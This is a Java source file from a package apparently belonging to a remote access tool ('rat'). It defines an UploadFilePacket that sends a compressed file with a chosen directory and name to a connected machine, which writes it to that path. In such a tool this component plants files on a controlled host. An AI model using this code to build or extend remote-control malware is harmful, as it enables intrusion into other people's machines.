package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.QuickLZ;

public final class UploadFilePacket implements IPacket {
	
	private byte[] data;
	private String directoryPath, fileName;
	
	private static final String USER_DIR = "user.dir";
	private static final String FILE_SEPARATOR = "/";
	
	public UploadFilePacket(final String filePath, final String folderPath) {
		this.directoryPath = folderPath;
		
		final File file = new File(filePath);
		
		data = FileUtils.readExternalData(filePath);
		fileName = file.getName();
	}
	
	public UploadFilePacket(final File file, final String folderPath) {
		this(file.getAbsolutePath(), folderPath);
	}
	
	public UploadFilePacket() {
		directoryPath = fileName = "";
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		final byte[] compressed = QuickLZ.compress(data);
		
		connection.writeInt(compressed.length);
		connection.write(compressed);
		connection.writeUTF(directoryPath);
		connection.writeUTF(fileName);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		final int length = connection.readInt();
		
		data = new byte[length];
		connection.read(data);
		data = QuickLZ.decompress(data);
		
		directoryPath = connection.readUTF();
		fileName = connection.readUTF();
		
		if (directoryPath.isEmpty()) {
			directoryPath = System.getProperty(USER_DIR);
		}
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		final File directory = new File(directoryPath);
		
		String path = null;
		
		if (directory.isDirectory()) {
			path = directoryPath + FILE_SEPARATOR + fileName;
		} else {
			final File parent = directory.getParentFile();
			
			if (parent != null) {
				path = parent.getAbsolutePath() + FILE_SEPARATOR + fileName;
			}
		}
		
		if (path != null) {
			FileUtils.writeData(path, data);
		}
	}
	
}
